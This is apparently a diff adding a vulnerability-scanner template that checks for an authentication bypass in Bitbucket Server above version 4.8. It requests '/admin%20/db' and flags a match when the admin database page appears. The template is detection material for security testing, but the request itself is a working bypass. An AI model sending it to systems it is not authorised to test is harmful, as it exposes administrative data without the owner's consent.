@@ -1,0 +1,26 @@
+id: bitbucket-auth-bypass
+brief:
+    title: Bitbucket Server > 4.8 - Authentication Bypass
+    by: DhiyaneshDk
+    level: critical
+    about: There is a permission bypass vulnerability through %20, which allows arbitrary users to obtain sensitive data
+    label:
+        - misconfig
+        - atlassian
+        - bitbucket
+        - auth-bypass
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/admin%20/db'
+      signs:
+        - "on": word
+          has:
+            - <h2>Database</h2>
+            - Migrate database
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
